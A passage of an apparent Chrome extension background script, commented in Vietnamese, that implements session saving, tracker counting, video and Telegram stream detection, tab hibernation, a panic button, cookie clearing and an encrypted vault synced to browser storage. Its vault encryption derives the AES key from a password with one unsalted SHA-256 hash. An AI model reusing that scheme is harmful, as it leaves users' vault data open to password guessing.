importScripts('email.min.js');
// Lưu trữ số lượng tracker theo tab
let trackerCount = {};
// Lưu trữ danh sách tracker chi tiết theo tab (mới)
let trackerList = {}; 
// Lưu trữ video phát hiện được theo tab
let detectedVideos = {};
let videoDetectionEnabled = false;

// Tab Hibernation State
let hibernationEnabled = false;
let hibernationTimeout = 30; // minutes
let tabLastActive = {}; // tabId -> timestamp
let tabUrls = {}; // tabId -> url (for auto-cleanup)

// Khởi tạo context menu
async function initContextMenus() {
    // Xóa tất cả menu cũ để tránh trùng lặp
    chrome.contextMenus.removeAll(() => {
        chrome.contextMenus.create({
            id: "sessionManager",
            title: "📋 Session Manager",
            contexts: ["page", "link"]
        });

        chrome.contextMenus.create({
            id: "saveAllTabs",
            parentId: "sessionManager",
            title: "💾 Lưu tất cả tab",
            contexts: ["page", "link"]
        });

        chrome.contextMenus.create({
            id: "saveNormalTabs",
            parentId: "sessionManager",
            title: "🌐 Lưu các tab thường",
            contexts: ["page", "link"]
        });

        chrome.contextMenus.create({
            id: "saveIncognitoTabs",
            parentId: "sessionManager",
            title: "🔒 Lưu các tab ẩn danh",
            contexts: ["page", "link"]
        });

        chrome.contextMenus.create({
            id: "saveCurrentTab",
            parentId: "sessionManager",
            title: "📄 Lưu tab hiện tại",
            contexts: ["page", "link"]
        });

        // Thêm vạch kẻ phân cách bên trong menu
        chrome.contextMenus.create({
            id: "separator_session",
            parentId: "sessionManager",
            type: "separator",
            contexts: ["page", "link"]
        });

        // Menu khôi phục phiên
        chrome.contextMenus.create({
            id: "restoreSessionParent",
            parentId: "sessionManager",
            title: "📂 Khôi phục phiên...",
            contexts: ["page", "link"]
        });

        // Lấy danh sách phiên từ storage để tạo menu con
        chrome.storage.local.get(['appSettings'], (result) => {
            const settings = result.appSettings || {};
            const sessions = settings.savedSessions || [];
            
            if (sessions.length === 0) {
                chrome.contextMenus.create({
                    id: "noSessions",
                    parentId: "restoreSessionParent",
                    title: "(Chưa có phiên nào)",
                    enabled: false,
                    contexts: ["page", "link"]
                });
            } else {
                // Hiển thị tối đa 5 phiên gần nhất
                sessions.slice(0, 5).forEach((session, index) => {
                    chrome.contextMenus.create({
                        id: `restoreSession_${session.id}`,
                        parentId: "restoreSessionParent",
                        title: `${index + 1}. ${session.name}`,
                        contexts: ["page", "link"]
                    });
                });
            }
        });
    });
}

chrome.runtime.onInstalled.addListener(initContextMenus);
chrome.runtime.onStartup.addListener(initContextMenus);

// Cập nhật menu khi storage thay đổi (để cập nhật danh sách phiên khôi phục)
chrome.storage.onChanged.addListener((changes, area) => {
    if (area === 'local' && changes.appSettings) {
        // Chỉ cập nhật nếu danh sách savedSessions thay đổi
        const oldSessions = changes.appSettings.oldValue?.savedSessions || [];
        const newSessions = changes.appSettings.newValue?.savedSessions || [];
        if (JSON.stringify(oldSessions) !== JSON.stringify(newSessions)) {
            initContextMenus();
        }
    }
});

// Xử lý click context menu
chrome.contextMenus.onClicked.addListener(async (info, tab) => {
    if (info.menuItemId.startsWith("save")) {
        const mode = info.menuItemId;
        const allTabs = await chrome.tabs.query({});
        let tabsToSave = [];

        if (mode === "saveAllTabs") {
            tabsToSave = allTabs;
        } else if (mode === "saveNormalTabs") {
            tabsToSave = allTabs.filter(t => !t.incognito);
        } else if (mode === "saveIncognitoTabs") {
            tabsToSave = allTabs.filter(t => t.incognito);
        } else if (mode === "saveCurrentTab") {
            tabsToSave = [tab];
        }

        if (tabsToSave.length === 0) {
            chrome.notifications.create({
                type: 'basic',
                iconUrl: 'icons/icon128.png',
                title: 'Session Manager',
                message: 'Không tìm thấy tab nào phù hợp để lưu.'
            });
            return;
        }

        const timestamp = new Date().toLocaleString();
        const sessionName = `Quick Session (${timestamp})`;

        const sessionData = {
            id: Date.now(),
            name: sessionName,
            date: new Date().toISOString(),
            tabType: mode.replace("save", "").toLowerCase(),
            tabs: tabsToSave.map(t => ({
                url: t.url,
                title: t.title,
                incognito: t.incognito
            }))
        };

        const result = await chrome.storage.local.get(['appSettings']);
        const settings = result.appSettings || {};
        if (!settings.savedSessions) settings.savedSessions = [];
        settings.savedSessions.unshift(sessionData);
        
        await chrome.storage.local.set({ appSettings: settings });

        chrome.notifications.create({
            type: 'basic',
            iconUrl: 'icons/icon128.png',
            title: 'Session Manager',
            message: `Đã lưu phiên "${sessionName}" với ${tabsToSave.length} tab.`
        });
    } else if (info.menuItemId.startsWith("restoreSession_")) {
        const sessionId = parseInt(info.menuItemId.split("_")[1]);
        const result = await chrome.storage.local.get(['appSettings']);
        const settings = result.appSettings || {};
        const sessions = settings.savedSessions || [];
        const session = sessions.find(s => s.id === sessionId);

        if (session) {
            // Nhóm các tab theo incognito
            const normalTabs = session.tabs.filter(t => !t.incognito);
            const incognitoTabs = session.tabs.filter(t => t.incognito);

            if (normalTabs.length > 0) {
                chrome.windows.create({
                    url: normalTabs.map(t => t.url),
                    incognito: false
                });
            }

            if (incognitoTabs.length > 0) {
                chrome.extension.isAllowedIncognitoAccess((isAllowed) => {
                    if (isAllowed) {
                        chrome.windows.create({
                            url: incognitoTabs.map(t => t.url),
                            incognito: true
                        });
                    } else {
                        // Mở ở cửa sổ thường nếu không được phép
                        chrome.windows.create({
                            url: incognitoTabs.map(t => t.url),
                            incognito: false
                        });
                    }
                });
            }
        }
    }
});

// Khởi tạo trạng thái ban đầu cho settings
chrome.storage.local.get(['appSettings'], (result) => {
    const settings = result.appSettings || {};
    videoDetectionEnabled = settings.videoDownloaderEnabled || false;
    hibernationEnabled = settings.hibernationEnabled || false;
    hibernationTimeout = settings.hibernationTimeout || 30;
});

// Danh sách các domain tracker phổ biến
const TRACKER_DOMAINS = [
    'google-analytics.com', 'doubleclick.net', 'facebook.net', 'googlesyndication.com',
    'adnxs.com', 'quantserve.com', 'scorecardresearch.com', 'amazon-adsystem.com',
    'casalemedia.com', 'criteo.com', 'rubiconproject.com', 'pubmatic.com'
];

// Các định dạng video cần phát hiện
const VIDEO_EXTENSIONS = ['mp4', 'mkv', 'webm', 'avi', 'mov', 'flv', 'wmv', 'm3u8', 'ts', 'mpd', 'm4v', '3gp', 'ogv', 'm4s'];
const TELEGRAM_STREAM_PATTERN = [
    'https://web.telegram.org/stream/*',
    'https://webk.telegram.org/stream/*',
    'https://webz.telegram.org/stream/*'
];

// Thêm listener này vào background.js
function setupTelegramStreamDetection() {
    chrome.webRequest.onBeforeRequest.addListener(
        (details) => {
            if (!videoDetectionEnabled) return;
            if (details.tabId === -1) return;

            const url = details.url;
            if (!url.includes('/stream/')) return;

            try {
                // Decode và parse JSON từ URL
                const encoded = url.split('/stream/')[1];
                const meta = JSON.parse(decodeURIComponent(encoded));

                const filename = meta.fileName || 'telegram_video.mp4';
                const size = meta.size ? (meta.size / 1024 / 1024).toFixed(1) + ' MB' : 'Streaming';

                addDetectedVideo(
                    details.tabId,
                    url,          // Absolute URL có thể fetch được
                    meta.mimeType || 'video/mp4',
                    size,
                    details.initiator,
                    ''
                );
            } catch(e) {
                // Không parse được, vẫn add với thông tin cơ bản
                addDetectedVideo(details.tabId, url, 'video/mp4', 'Telegram Stream', details.initiator, '');
            }
        },
        { urls: TELEGRAM_STREAM_PATTERN },
        ['requestBody']
    );
}
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {
        if (details.tabId === -1) return;
        
        const urlString = details.url;
        const url = new URL(urlString);
        const isTracker = TRACKER_DOMAINS.some(domain => url.hostname.includes(domain));
        
        if (isTracker) {
            const domain = url.hostname;
            
            // Cập nhật danh sách chi tiết
            if (!trackerList[details.tabId]) trackerList[details.tabId] = [];
            const existing = trackerList[details.tabId].find(t => t.domain === domain);
            if (existing) {
                existing.count++;
                existing.lastSeen = Date.now();
            } else {
                trackerList[details.tabId].push({
                    domain: domain,
                    firstSeen: Date.now(),
                    lastSeen: Date.now(),
                    count: 1
                });
            }

            // Cập nhật tổng số lượng
            trackerCount[details.tabId] = (trackerCount[details.tabId] || 0) + 1;
            chrome.runtime.sendMessage({
                type: 'updateTrackerCount',
                tabId: details.tabId,
                count: trackerCount[details.tabId],
                list: trackerList[details.tabId] // Gửi kèm danh sách để popup cập nhật real-time
            }).catch(() => {});
        }

        // Logic phát hiện video qua URL (extension)
        if (videoDetectionEnabled) {
            const path = url.pathname.toLowerCase();
            const extension = path.split('.').pop();
            
            // Bắt link manifest HLS/DASH hoặc link video trực tiếp
            if (VIDEO_EXTENSIONS.includes(extension) || 
                urlString.includes('.m3u8') || 
                urlString.includes('.mpd') || 
                urlString.includes('googlevideo.com') ||
                urlString.includes('/videoplayback') ||
                urlString.includes('manifest') ||
                urlString.includes('.ts')) {
                
                // Nếu là file fragment (.ts), lọc bỏ các mảnh nhỏ lặp lại, chỉ bắt file đầu tiên hoặc mảnh lớn
                if (extension === 'ts' && urlString.includes('seg-')) {
                    // Chỉ lấy mảnh 1 để báo hiệu có luồng stream
                    if (!urlString.includes('seg-1.')) return;
                }

                const type = extension || (urlString.includes('m3u8') ? 'm3u8' : 'video');
                addDetectedVideo(details.tabId, urlString, type, 'Streaming...', details.initiator, '');
            }
        }
    },
    { urls: ["<all_urls>"] }
);

// Listen for new tab creation from Privacy Player (popup iframe)
chrome.webNavigation.onCreatedNavigationTarget.addListener((details) => {
    // Check if the source is our extension popup (sourceTabId is -1)
    if (details.sourceTabId === -1) {
        chrome.storage.local.get(['appSettings'], (result) => {
            const settings = result.appSettings || {};
            
            // If user wants Incognito for new tabs from Privacy Player
            if (settings.playerLinkBehavior === 'incognito') {
                chrome.extension.isAllowedIncognitoAccess((isAllowed) => {
                    if (isAllowed) {
                        // Close the newly created tab
                        chrome.tabs.remove(details.tabId);
                        
                        // Re-open in Incognito window
                        chrome.windows.create({
                            url: details.url,
                            incognito: true,
                            type: 'popup',
                            width: 800,
                            height: 600
                        });
                    }
                });
            }
        });
    }
});

// Phát hiện video qua Response Headers (MIME Type)
chrome.webRequest.onHeadersReceived.addListener(
    (details) => {
        if (!videoDetectionEnabled || details.tabId === -1) return;

        const contentTypeHeader = details.responseHeaders.find(h => h.name.toLowerCase() === 'content-type');
        const contentLengthHeader = details.responseHeaders.find(h => h.name.toLowerCase() === 'content-length');
        
        if (contentTypeHeader) {
            const contentType = contentTypeHeader.value.toLowerCase();
            // Kiểm tra Content-Type hoặc các định dạng video phổ biến
            if (contentType.startsWith('video/') || 
                contentType === 'application/x-mpegurl' || 
                contentType === 'application/vnd.apple.mpegurl' ||
                contentType === 'application/dash+xml' ||
                contentType === 'application/octet-stream' && isVideoUrl(details.url)) {
                
                let size = 'Unknown size';
                if (contentLengthHeader) {
                    const bytes = parseInt(contentLengthHeader.value);
                    if (bytes > 1024 * 1024) size = (bytes / (1024 * 1024)).toFixed(1) + ' MB';
                    else if (bytes > 1024) size = (bytes / 1024).toFixed(1) + ' KB';
                    else size = bytes + ' bytes';
                }
                
                let type = contentType.split('/')[1] || 'video';
                if (type.includes(';')) type = type.split(';')[0];
                if (type === 'x-mpegurl' || type === 'vnd.apple.mpegurl') type = 'm3u8';
                
                addDetectedVideo(details.tabId, details.url, type, size, details.initiator, '');
            }
        }
    },
    { urls: ["<all_urls>"] },
    ["responseHeaders"]
);

/**
 * Kiểm tra xem URL có khả năng là video không dựa trên extension
 */
function isVideoUrl(url) {
    const path = new URL(url).pathname.toLowerCase();
    const extension = path.split('.').pop();
    return VIDEO_EXTENSIONS.includes(extension);
}

/**
 * Hàm hỗ trợ thêm video vào danh sách phát hiện
 */
function addDetectedVideo(tabId, url, type, size = 'Unknown size', initiator = '', title = '', thumb = '', frameId = 0) {
    if (!detectedVideos[tabId]) {
        detectedVideos[tabId] = [];
    }

    if (initiator && initiator.includes(chrome.runtime.id)) return;
    
    // FIX: Bỏ qua relative URL và stream URL dạng không phải absolute HTTP
    // Telegram stream URL khi được bắt qua webRequest đã là absolute,
    // nhưng nếu không thì bỏ qua để tránh crash
    if (!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('blob:')) {
        console.warn('[Video Detector] Bỏ qua URL không hợp lệ:', url.substring(0, 80));
        return;
    }

    const normalizedUrl = url.split('?')[0];
    const existingIndex = detectedVideos[tabId].findIndex(v => v.url.split('?')[0] === normalizedUrl);

    if (existingIndex !== -1) {
        const existing = detectedVideos[tabId][existingIndex];
        if (title && (!existing.filename || existing.filename.length < title.length)) {
            existing.filename = decodeURIComponent(title);
        }
        if (thumb && !existing.thumbnail) {
            existing.thumbnail = thumb;
        }
        return;
    }

    let filename = '';
    if (url.startsWith('blob:')) {
        filename = title || `streaming_video_${Date.now()}`;
    } else {
        try {
            const urlObj = new URL(url);
            // Với Telegram stream URL, lấy tên từ JSON metadata thay vì pathname
            if (url.includes('/stream/')) {
                try {
                    const meta = JSON.parse(decodeURIComponent(urlObj.pathname.split('/stream/')[1] || '{}'));
                    filename = title || meta.fileName || `telegram_stream_${Date.now()}.mp4`;
                } catch(e) {
                    filename = title || `telegram_stream_${Date.now()}.mp4`;
                }
            } else {
                filename = title || urlObj.pathname.split('/').pop() || 'video_file';
            }
        } catch(e) {
            // URL không parse được, dùng title hoặc fallback
            filename = title || `video_${Date.now()}`;
        }
    }

    filename = filename.replace(/[<>:"/\\|?*]/g, '_').trim();
    if (!filename.includes('.')) {
        let ext = 'mp4';
        if (type.includes('m3u8')) ext = 'm3u8';
        else if (type.includes('mpd')) ext = 'mpd';
        filename += '.' + ext;
    }

    const videoData = {
        url, type, size,
        filename: decodeURIComponent(filename),
        thumbnail: thumb,
        tabId, frameId,
        timestamp: Date.now()
    };

    detectedVideos[tabId].push(videoData);

    chrome.action.setBadgeText({ text: detectedVideos[tabId].length.toString(), tabId });
    chrome.action.setBadgeBackgroundColor({ color: '#e53e3e' });
    chrome.runtime.sendMessage({ type: 'newVideoDetected', tabId, video: videoData }).catch(() => {});
}

// Lắng nghe các thay đổi URL trong iframe để cập nhật cho popup
function handleIframeNavigation(details) {
    // Chỉ xử lý nếu yêu cầu xuất phát từ extension (Privacy Player)
    // Hoặc nếu nó là một sub_frame điều hướng
    chrome.runtime.sendMessage({
        type: 'iframeNavigated',
        tabId: details.tabId,
        url: details.url,
        frameId: details.frameId,
        processId: details.processId,
        timestamp: Date.now()
    }).catch(() => {});
}

// Bắt các yêu cầu mạng từ Privacy Player (iframe chính) để cập nhật URL nhanh hơn
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {
        // Chỉ xử lý nếu là sub_frame (iframe của Privacy Player) và initiator là chính extension
        if (details.type === 'sub_frame' && details.initiator && details.initiator.startsWith('chrome-extension://')) {
            handleIframeNavigation(details);
        }
    },
    { urls: ["<all_urls>"] }
);

// LƯU Ý: Không sử dụng chrome.webNavigation.onCommitted một cách global vì nó sẽ bắt tất cả các tab trong trình duyệt,
// gây nhiễu cho Privacy Player và làm chậm hệ thống. 
// Việc cập nhật URL chi tiết hơn đã được xử lý bởi iframe_content_script.js (chỉ khi window.parent === window.top).

// Reset tracker và video khi tab load lại hoặc đóng
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'loading') {
        trackerCount[tabId] = 0;
        trackerList[tabId] = []; // Reset danh sách
        detectedVideos[tabId] = [];
        // Reset badge
        chrome.action.setBadgeText({ text: '', tabId: tabId });
    }
    if (tab.url && !tab.url.startsWith('chrome')) {
        tabUrls[tabId] = tab.url;
    }
});

chrome.tabs.onRemoved.addListener((tabId) => {
    // 1. Auto-Cleanup Logic (Auto-Cookie Destroyer)
    chrome.storage.local.get(['appSettings'], async (result) => {
        const settings = result.appSettings || {};
        if (settings.cookieDestroyer && tabUrls[tabId]) {
            try {
                const url = new URL(tabUrls[tabId]);
                const domain = url.hostname;
                const whitelist = settings.whitelist || [];
                
                // Kiểm tra xem domain có trong whitelist không
                const isWhitelisted = whitelist.some(d => domain.includes(d));
                
                if (!isWhitelisted) {
                    const cookies = await chrome.cookies.getAll({ domain: domain });
                    await Promise.all(
                        cookies.map(c => {
                            const cookieUrl = `http${c.secure ? 's' : ''}://${c.domain}${c.path}`;
                            return chrome.cookies.remove({ url: cookieUrl, name: c.name });
                        })
                    );
                    console.log(`Auto-Cleanup: Cookies for ${domain} removed.`);
                } else {
                    console.log(`Auto-Cleanup: Skip ${domain} (Whitelisted).`);
                }
            } catch (e) {
                console.error('Auto-Cleanup Error:', e);
            }
        }
        delete tabUrls[tabId];
    });

    delete trackerCount[tabId];
    delete trackerList[tabId]; // Xóa danh sách chi tiết
    delete detectedVideos[tabId];
    delete tabLastActive[tabId];
});

// Tab Hibernation Logic
chrome.tabs.onActivated.addListener((activeInfo) => {
    tabLastActive[activeInfo.tabId] = Date.now();
});

// Kiểm tra và ngủ đông tab mỗi phút
setInterval(() => {
    if (!hibernationEnabled) return;

    const now = Date.now();
    const timeoutMs = hibernationTimeout * 60 * 1000;

    chrome.tabs.query({ active: false, pinned: false, discarded: false }, (tabs) => {
        tabs.forEach(tab => {
            const lastActive = tabLastActive[tab.id] || 0;
            if (lastActive > 0 && (now - lastActive) > timeoutMs) {
                chrome.tabs.discard(tab.id, (discardedTab) => {
                    if (chrome.runtime.lastError) {
                        console.error('Hibernation error:', chrome.runtime.lastError);
                    } else {
                        console.log(`Tab ${tab.id} hibernated to save RAM.`);
                    }
                });
            }
        });
    });
}, 60000); // Mỗi 1 phút

// Thêm vào message listener để popup lấy số liệu
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'getTrackerCount') {
        sendResponse({ 
            count: trackerCount[request.tabId] || 0,
            list: trackerList[request.tabId] || []
        });
    } else if (request.type === 'getDetectedVideos') {
        sendResponse({ videos: detectedVideos[request.tabId] || [] });
    } else if (request.type === 'toggleVideoDetection') {
        videoDetectionEnabled = request.enabled;
    } else if (request.type === 'newVideoDetected') {
        // Cho phép lưu video được gửi từ content script (scan)
        if (request.video && request.tabId) {
            addDetectedVideo(request.tabId, request.video.url, request.video.type, request.video.size || 'Scan detected', '', request.video.filename, request.video.thumbnail, request.video.frameId);
        }
    } else if (request.type === 'newVideoDetectedFromContent') {
        // Tự động lưu video được phát hiện từ content script (auto detect)
        if (request.video && sender.tab) {
            // Đồng bộ URL frame về popup nếu có thông tin URL mới
            if (request.video.currentFrameUrl) {
                chrome.runtime.sendMessage({
                    type: 'iframeNavigated',
                    url: request.video.currentFrameUrl,
                    tabId: sender.tab.id,
                    frameId: sender.frameId,
                    fromContentScript: true
                }).catch(() => {});
            }

            addDetectedVideo(sender.tab.id, request.video.url, request.video.type, request.video.size || 'Detected', '', request.video.filename, request.video.thumbnail, sender.frameId);
        }
    } else if (request.type === 'pageNavigatedInFrame') {
        // Đồng bộ URL frame về popup khi content script thông báo trang mới load
        chrome.runtime.sendMessage({
            type: 'iframeNavigated',
            url: request.url,
            title: request.title,
            fromContentScript: true
        }).catch(() => {});
    } else if (request.type === 'updateHibernation') {
        hibernationEnabled = request.enabled;
        hibernationTimeout = request.timeout;
    }
    return true; // Keep message channel open for async responses
});

chrome.runtime.onInstalled.addListener(() => {
    // Kiểm tra cài đặt để quyết định có mở side panel mặc định hay không
    chrome.storage.local.get(['appSettings'], (result) => {
        const settings = result.appSettings || {};
        const useSidePanel = settings.useSidePanel || false;
        chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: useSidePanel })
            .catch((error) => console.error(error));
    });

    chrome.notifications.create({
        type: 'basic',
        title: 'Privacy & Cookie Manager',
        message: 'Welcome to Cookie Manager! Click the extension icon to get started.',
        iconUrl: 'icons/icon128.png'
    });

    // Thêm menu chuột phải
    chrome.contextMenus.create({
        id: "addToVault",
        title: "Add to Privacy Vault 🔐",
        contexts: ["page", "link"]
    });

    chrome.contextMenus.create({
        id: "addToFavorites",
        title: "Add to Favorite Websites ⭐",
        contexts: ["page", "link"]
    });

    chrome.contextMenus.create({
        id: "quickPanic",
        title: "Quick Panic Button 🚨",
        contexts: ["all"]
    });

    chrome.contextMenus.create({
        id: "quickSaveSession",
        title: "Quick Save Session 📋",
        contexts: ["all"]
    });
});

// Hàm thực hiện Panic
async function executePanic() {
    chrome.storage.local.get(['appSettings'], (result) => {
        const settings = result.appSettings || {};
        const action = settings.panicAction || 'closeIncognito';
        
        // Lấy ngẫu nhiên một URL từ danh sách an toàn, nếu không có thì dùng mặc định
        let safeUrl = 'https://www.google.com';
        if (settings.safeUrls && settings.safeUrls.length > 0) {
            const randomIndex = Math.floor(Math.random() * settings.safeUrls.length);
            safeUrl = settings.safeUrls[randomIndex];
        } else if (settings.safeRedirectUrl) {
            safeUrl = settings.safeRedirectUrl;
        }

        switch (action) {
            case 'closeIncognito':
                chrome.windows.getAll({ populate: true }, (windows) => {
                    windows.forEach(win => {
                        if (win.incognito) {
                            chrome.windows.remove(win.id);
                        }
                    });
                    // Mở Safe Redirect URL trên tab bình thường
                    chrome.tabs.create({ url: safeUrl });
                });
                break;
            case 'redirectAll':
                chrome.tabs.query({}, (tabs) => {
                    tabs.forEach(tab => {
                        chrome.tabs.update(tab.id, { url: safeUrl });
                    });
                });
                break;
            case 'closeAll':
                // Mở Safe Redirect URL trong cửa sổ mới TRƯỚC khi đóng tất cả
                chrome.windows.create({ url: safeUrl, focused: true }, () => {
                    chrome.windows.getAll({}, (windows) => {
                        windows.forEach(win => {
                            chrome.windows.get(win.id, (w) => {
                                // Kiểm tra và không đóng cửa sổ mới tạo
                                if (w.tabs && w.tabs[0] && w.tabs[0].url !== safeUrl) {
                                    chrome.windows.remove(win.id);
                                }
                            });
                        });
                    });
                });
                break;
        }
    });
}

// Hàm thực hiện Save Session nhanh
async function executeQuickSaveSession() {
    try {
        const tabs = await chrome.tabs.query({});
        const sessionName = `Quick Session ${new Date().toLocaleString()}`;
        const sessionData = {
            id: Date.now(),
            name: sessionName,
            date: new Date().toISOString(),
            tabType: 'all',
            tabs: tabs.map(t => ({
                url: t.url,
                title: t.title,
                incognito: t.incognito
            }))
        };

        chrome.storage.local.get(['appSettings'], (result) => {
            const settings = result.appSettings || {};
            if (!settings.savedSessions) settings.savedSessions = [];
            settings.savedSessions.unshift(sessionData);
            chrome.storage.local.set({ appSettings: settings }, () => {
                chrome.notifications.create({
                    type: 'basic',
                    title: 'Session Manager',
                    message: `Đã lưu phiên làm việc nhanh: ${sessionName}`,
                    iconUrl: 'icons/icon128.png'
                });
            });
        });
    } catch (error) {
        console.error('Quick Save Session Error:', error);
    }
}

// Lắng nghe sự kiện command (shortcut)
chrome.commands.onCommand.addListener((command) => {
    if (command === "activate_panic") {
        executePanic();
    }
});

/**
 * Encryption Helper Functions for Vault Sync (Background)
 */
async function deriveKey(password) {
    const encoder = new TextEncoder();
    const data = encoder.encode(password);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return await crypto.subtle.importKey(
        'raw', 
        hash, 
        { name: 'AES-GCM' }, 
        false, 
        ['encrypt', 'decrypt']
    );
}

async function encryptData(data, password) {
    try {
        const key = await deriveKey(password);
        const encoder = new TextEncoder();
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encodedData = encoder.encode(JSON.stringify(data));
        const encryptedContent = await crypto.subtle.encrypt(
            { name: 'AES-GCM', iv: iv },
            key,
            encodedData
        );
        
        return {
            iv: Array.from(iv),
            content: Array.from(new Uint8Array(encryptedContent))
        };
    } catch (e) {
        console.error('Encryption error:', e);
        return null;
    }
}

async function decryptData(encryptedObj, password) {
    try {
        const key = await deriveKey(password);
        const iv = new Uint8Array(encryptedObj.iv);
        const content = new Uint8Array(encryptedObj.content);
        const decryptedContent = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: iv },
            key,
            content
        );
        
        const decoder = new TextDecoder();
        return JSON.parse(decoder.decode(decryptedContent));
    } catch (e) {
        console.error('Decryption error:', e);
        return null;
    }
}

async function syncVaultToCloud() {
    chrome.storage.local.get(['appSettings', 'privacyVault'], async (result) => {
        const settings = result.appSettings || {};
        const vault = result.privacyVault || [];
        
        if (!settings.vaultSyncEnabled || !settings.masterSyncKey || vault.length === 0) return;

        // Try to get session password
        chrome.storage.session.get(['sessionPassword'], async (sessionResult) => {
            const password = sessionResult.sessionPassword;
            if (!password) return; // Cannot sync in background without session password

            // Decrypt Master Key with session password
            const masterKey = await decryptData(settings.masterSyncKey, password);
            if (!masterKey) return;

            // Encrypt Vault with Master Key
            const encrypted = await encryptData(vault, masterKey);
            if (encrypted) {
                chrome.storage.sync.set({ encryptedVault: encrypted }, () => {
                    console.log('Vault synced to cloud from background (Master Key)');
                });
            }
        });
    });
}

// Lắng nghe sự kiện click menu chuột phải
chrome.contextMenus.onClicked.addListener((info, tab) => {
    if (info.menuItemId === "quickPanic") {
        executePanic();
    } else if (info.menuItemId === "addToVault") {
        const item = {
            id: Date.now(),
            title: tab.title || "No Title",
            url: info.linkUrl || info.pageUrl,
            date: new Date().toISOString()
        };

        // Lưu vào storage
        chrome.storage.local.get(['privacyVault'], (result) => {
            const vault = result.privacyVault || [];
            vault.push(item);
            chrome.storage.local.set({ privacyVault: vault }, () => {
                syncVaultToCloud(); // Sync after adding
                chrome.notifications.create({
                    type: 'basic',
                    title: 'Privacy Vault',
                    message: `Đã thêm "${item.title.substring(0, 20)}..." vào két sắt bí mật!`,
                    iconUrl: 'icons/icon128.png'
                });
            });
        });
    } else if (info.menuItemId === "addToFavorites") {
        const favoriteItem = {
            name: tab.title || "New Favorite",
            url: info.linkUrl || info.pageUrl
        };

        // Lưu vào appSettings.favoriteWebsites
        chrome.storage.local.get(['appSettings'], (result) => {
            const settings = result.appSettings || {};
            const favorites = settings.favoriteWebsites || [];
            
            // Tránh trùng lặp URL
            if (!favorites.some(f => f.url === favoriteItem.url)) {
                favorites.push(favoriteItem);
                settings.favoriteWebsites = favorites;
                chrome.storage.local.set({ appSettings: settings }, () => {
                    chrome.notifications.create({
                        type: 'basic',
                        title: 'Favorite Websites',
                        message: `Đã thêm "${favoriteItem.name.substring(0, 20)}..." vào trang web yêu thích!`,
                        iconUrl: 'icons/icon128.png'
                    });
                });
            } else {
                chrome.notifications.create({
                    type: 'basic',
                    title: 'Favorite Websites',
                    message: 'Trang web này đã có trong danh sách yêu thích!',
                    iconUrl: 'icons/icon128.png'
                });
            }
        });
    } else if (info.menuItemId === "quickPanic") {
        executePanic();
    } else if (info.menuItemId === "quickSaveSession") {
        executeQuickSaveSession();
    }
});

// Lắng nghe sự kiện đóng tab để xóa cookie
chrome.tabs.onRemoved.addListener((tabId, removeInfo) => {
    chrome.storage.local.get(['appSettings', 'tabUrlMapping', 'privacyPlayerTabId'], (result) => {
        const settings = result.appSettings || {};
        const mapping = result.tabUrlMapping || {};
        const playerTabId = result.privacyPlayerTabId;
        
        // Nếu đây là tab Privacy Player bị đóng
        if (tabId === playerTabId) {
            // Xóa ID tab player khỏi storage
            chrome.storage.local.remove('privacyPlayerTabId');
            
            // Xử lý dọn dẹp lịch sử/URL cuối cùng nếu bật Auto-clear
            if (settings.autoClearStealth) {
                chrome.storage.local.remove('lastPlayerUrl');
                console.log('Privacy Player: Auto-clear Stealth History (lastPlayerUrl removed)');
            }
        }

        // Xử lý dọn dẹp Cookie/Mapping
        if (mapping[tabId]) {
            // Chỉ xóa Cookie nếu bật cookieDestroyer
            if (settings.cookieDestroyer) {
                const urlString = mapping[tabId];
                try {
                    const url = new URL(urlString);
                    const domain = url.hostname;
                    
                    chrome.cookies.getAll({ domain: domain }, (cookies) => {
                        cookies.forEach(c => {
                            const cookieUrl = `http${c.secure ? 's' : ''}://${c.domain}${c.path}`;
                            chrome.cookies.remove({ url: cookieUrl, name: c.name });
                        });
                    });
                    console.log(`Auto-Cookie Destroyer: Cleared cookies for ${domain}`);
                } catch (e) {
                    console.error('Auto-Cookie Destroyer Error:', e);
                }
            }
            
            // Luôn xóa mapping của tab khi tab đó đóng để tránh rác storage
            delete mapping[tabId];
            chrome.storage.local.set({ tabUrlMapping: mapping });
        }
    });
});

// Cập nhật mapping khi tab thay đổi URL hoặc tab mới được tạo
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    // Chỉ lưu URL vào tabUrlMapping nếu đây là tab Privacy Player
    chrome.storage.local.get(['privacyPlayerTabId', 'appSettings'], (result) => {
        const playerTabId = result.privacyPlayerTabId;
        const settings = result.appSettings || {};

        if (tabId === playerTabId && changeInfo.url) {
            // Đây là URL của chính trang privacy_player.html, không phải iframe bên trong
            // Ta không cần lưu URL này vào tabUrlMapping hay lastPlayerUrl vì nó sẽ làm hỏng khôi phục
            console.log('Privacy Player Container updated (ignoring URL update)');
        }
    });

    // Tự động tiêm telegram_content.js khi vào Telegram Web
    if (changeInfo.status === 'complete' && tab.url) {
        const isTelegram = ['web.telegram.org', 'webk.telegram.org', 'webz.telegram.org']
            .some(h => tab.url.includes(h));
            
        if (isTelegram) {
            chrome.storage.local.get(['appSettings'], (result) => {
                const settings = result.appSettings || {};
                if (settings.telegramDownloaderEnabled) {
                    chrome.scripting.executeScript({
                        target: { tabId },
                        files: ['telegram_content.js']
                    }).catch(err => console.error('Auto-inject Telegram error:', err));
                }
            });
        }
    }
});

chrome.tabs.onCreated.addListener((tab) => {
    chrome.storage.local.get(['appSettings', 'privacyPlayerTabId'], (result) => {
        const settings = result.appSettings || {};
        const playerTabId = result.privacyPlayerTabId;

        // Nếu tab mới được tạo từ Privacy Player (openerTabId trùng khớp)
        // HOẶC nếu Link Click Behavior là 'player' (All Links) hoặc 'block'
        const isFromPlayer = tab.openerTabId && tab.openerTabId === playerTabId;
        
        if ((settings.linkClickBehavior === 'player' || settings.linkClickBehavior === 'block') && isFromPlayer) {
            // Ngay lập tức đóng tab này để không để lại dấu vết trên trình duyệt chính
            chrome.tabs.remove(tab.id);
            
            const targetUrl = tab.pendingUrl || tab.url;
            if (targetUrl && !targetUrl.startsWith('chrome://')) {
                if (settings.linkClickBehavior === 'player' && playerTabId) {
